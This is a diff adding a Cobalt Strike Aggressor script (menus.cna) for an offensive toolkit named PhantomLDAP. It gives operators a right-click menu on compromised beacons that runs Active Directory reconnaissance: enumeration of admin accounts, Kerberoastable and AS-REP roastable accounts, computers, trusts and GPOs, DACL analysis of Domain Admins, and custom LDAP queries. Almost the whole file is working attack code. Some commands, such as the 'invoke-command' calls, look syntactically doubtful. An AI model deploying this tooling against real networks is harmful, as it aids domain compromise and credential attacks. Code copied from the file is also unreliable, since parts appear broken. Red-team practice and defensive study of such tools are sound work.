@@ -1,0 +1,248 @@
+﻿# =============================================================================
+# PhantomLDAP — menus.cna
+# =============================================================================
+#
+# PURPOSE
+#   Installs a "PhantomLDAP" right-click context menu under the Beacons
+#   table (beacon_bottom popup) so operators can launch any enumeration
+#   module with a single click — no command memorisation required.
+#
+#   All heavy lifting (BOF loading, argument packing, argument validation)
+#   is delegated to the alias handlers defined in phantom_ldap.cna so that
+#   menu items and command-line invocations always share identical code paths.
+#
+# DEPENDENCY
+#   Must be sourced AFTER helpers.cna and phantom_ldap.cna so that:
+#     · load_bof_or_fail() is available
+#     · All bof_enum_* and bof_ldap_query aliases are registered
+#
+# MENU STRUCTURE
+#   PhantomLDAP
+#     ├── Enum Admin Accounts (adminCount=1)
+#     ├── ─────────────────────────────────
+#     ├── Enum Kerberoastable Accounts (SPN)
+#     ├── Enum AS-REP Roastable Accounts
+#     ├── ─────────────────────────────────
+#     ├── Enum Computers & OS Info
+#     ├── Enum Domain Trusts
+#     ├── Enum Group Policy Objects
+#     ├── ─────────────────────────────────
+#     └── Advanced
+#           ├── Analyze Object DACL …         (prompt for DN)
+#           ├── Custom LDAP Query …           (prompt for filter + attrs)
+#           ├── ─────────────────────────────
+#           └── PhantomLDAP Help
+#
+# AUTHOR   PhantomLDAP Project
+# VERSION  1.0.0
+# =============================================================================
+
+
+# =============================================================================
+# § 1. Beacon right-click context menu
+# =============================================================================
+#
+# beacon_bottom is the popup menu shown when the operator right-clicks a row
+# (or multiple rows) in the Beacons table.  $1 inside popup blocks is the
+# array of selected beacon IDs (@ids) — we iterate over all selected beacons
+# so the operator can multi-task against several targets at once.
+#
+popup beacon_bottom {
+    menu "PhantomLDAP" {
+
+        # ── § 1.1  High-value account enumeration ────────────────────────────
+
+        item "🔍 Enum Admin Accounts (adminCount=1)" {
+            # Fire against every selected beacon simultaneously.
+            foreach $bid (keys($1)) {
+                if (!validate_beacon($bid)) { continue; }
+
+                phantom_opsec_warn($bid, "enum_admins",
+                    "(&(objectCategory=person)(objectClass=user)(adminCount=1))");
+
+                # Delegate to the registered alias — no DC argument (auto-discover).
+                invoke-command "bof_enum_admins" . " " . $bid;
+            }
+        }
+
+        separator;
+
+        item "🎫 Enum Kerberoastable Accounts (SPN)" {
+            foreach $bid (keys($1)) {
+                if (!validate_beacon($bid)) { continue; }
+
+                phantom_opsec_warn($bid, "enum_spn",
+                    "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))");
+
+                invoke-command "bof_enum_spn" . " " . $bid;
+            }
+        }
+
+        item "🔓 Enum AS-REP Roastable Accounts" {
+            foreach $bid (keys($1)) {
+                if (!validate_beacon($bid)) { continue; }
+
+                phantom_opsec_warn($bid, "enum_asrep",
+                    "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))");
+
+                invoke-command "bof_enum_asrep" . " " . $bid;
+            }
+        }
+
+        separator;
+
+        # ── § 1.2  Infrastructure enumeration ────────────────────────────────
+
+        item "💻 Enum Computers & OS Info" {
+            foreach $bid (keys($1)) {
+                if (!validate_beacon($bid)) { continue; }
+
+                phantom_opsec_warn($bid, "enum_computers", "(objectClass=computer)");
+
+                invoke-command "bof_enum_computers" . " " . $bid;
+            }
+        }
+
+        item "🌐 Enum Domain Trusts" {
+            foreach $bid (keys($1)) {
+                if (!validate_beacon($bid)) { continue; }
+
+                phantom_opsec_warn($bid, "enum_trusts", "(objectClass=trustedDomain)");
+
+                invoke-command "bof_enum_trusts" . " " . $bid;
+            }
+        }
+
+        item "📋 Enum Group Policy Objects" {
+            foreach $bid (keys($1)) {
+                if (!validate_beacon($bid)) { continue; }
+
+                phantom_opsec_warn($bid, "enum_gpo", "(objectClass=groupPolicyContainer)");
+
+                invoke-command "bof_enum_gpo" . " " . $bid;
+            }
+        }
+
+        separator;
+
+        # ── § 1.3  Advanced / interactive operations ──────────────────────────
+
+        menu "⚙ Advanced" {
+
+            item "🔐 Analyze Object DACL…" {
+                # Obtain the selected beacons once; the prompt callback fires
+                # asynchronously so we capture $bid via lambda closure.
+                local('$bid');
+                foreach $bid (keys($1)) {
+                    if (!validate_beacon($bid)) { continue; }
+
+                    # Prompt the operator for the target Distinguished Name.
+                    # Default is Domain Admins as the most common high-value target.
+                    prompt_text(
+                        "PhantomLDAP — Analyze Object DACL",
+                        "CN=Domain Admins,CN=Users,DC=corp,DC=local",
+                        lambda({
+                            # $1 = text entered by the operator
+                            local('$dn $bof_data $args');
+                            $dn = ["$1" trim];
+
+                            if ($dn eq "" || $dn is $null) {
+                                berror($bid, "[!] PhantomLDAP: DACL analysis cancelled — no DN provided.");
+                                return;
+                            }
+
+                            $bof_data = load_bof_or_fail($bid, "enum_acl");
+                            if ($bof_data is $null) { return; }
+
+                            phantom_log_banner($bid);
+                            phantom_opsec_warn($bid, "enum_acl", "DN: " . $dn);
+
+                            blog($bid, "[*] PhantomLDAP: Analyzing DACL for: " . $dn);
+
+                            # Pack: Z (target DN) + Z (DC, empty = auto-discover)
+                            $args = bof_pack($bid, "ZZ", $dn, "");
+                            beacon_inline_execute($bid, $bof_data, "go", $args);
+
+                        }, $bid => $bid)
+                    );
+                }
+            }
+
+            item "🔎 Custom LDAP Query…" {
+                local('$bid');
+                foreach $bid (keys($1)) {
+                    if (!validate_beacon($bid)) { continue; }
+
+                    # Two-step prompt: first the filter, then the attribute list.
+                    # We nest the second prompt_text inside the first callback.
+                    prompt_text(
+                        "PhantomLDAP — Custom LDAP Query (1/2): Filter",
+                        "(&(objectClass=user)(adminCount=1))",
+                        lambda({
+                            local('$filter');
+                            $filter = ["$1" trim];
+
+                            if ($filter eq "" || $filter is $null) {
+                                berror($bid, "[!] PhantomLDAP: Query cancelled — no filter provided.");
+                                return;
+                            }
+
+                            prompt_text(
+                                "PhantomLDAP — Custom LDAP Query (2/2): Attributes (comma-separated)",
+                                "sAMAccountName,distinguishedName,memberOf",
+                                lambda({
+                                    local('$attrs $bof_data $args');
+                                    $attrs = ["$1" trim];
+
+                                    if ($attrs eq "" || $attrs is $null) {
+                                        berror($bid, "[!] PhantomLDAP: Query cancelled — no attributes provided.");
+                                        return;
+                                    }
+
+                                    $bof_data = load_bof_or_fail($bid, "ldap_query");
+                                    if ($bof_data is $null) { return; }
+
+                                    phantom_log_banner($bid);
+                                    phantom_opsec_warn($bid, "ldap_query", $filter);
+
+                                    blog($bid, "[*] PhantomLDAP: Executing custom query...");
+                                    blog($bid, "    Filter : " . $filter);
+                                    blog($bid, "    Attrs  : " . $attrs);
+
+                                    # Pack via shared helper: subtree scope, no DC/baseDN override
+                                    $args = phantom_pack_query($bid, $filter, $attrs,
+                                                               "", "subtree", "");
+                                    beacon_inline_execute($bid, $bof_data, "go", $args);
+
+                                }, $bid => $bid, $filter => $filter)
+                            );
+
+                        }, $bid => $bid)
+                    );
+                }
+            }
+
+            separator;
+
+            item "❓ PhantomLDAP Help" {
+                # Help is purely local — no BOF execution, no network traffic.
+                foreach $bid (keys($1)) {
+                    if (!validate_beacon($bid)) { continue; }
+                    invoke-command "bof_phantom_help" . " " . $bid;
+                }
+            }
+
+        } # end menu "Advanced"
+
+    } # end menu "PhantomLDAP"
+} # end popup beacon_bottom
+
+
+# =============================================================================
+# § 2. Script initialization confirmation
+# =============================================================================
+#
+# Printed to the Cobalt Strike script console when menus.cna is loaded.
+# Helps operators confirm that the menu extension loaded successfully.
+#
+println("[PhantomLDAP] menus.cna loaded — right-click a beacon to access PhantomLDAP menu.");
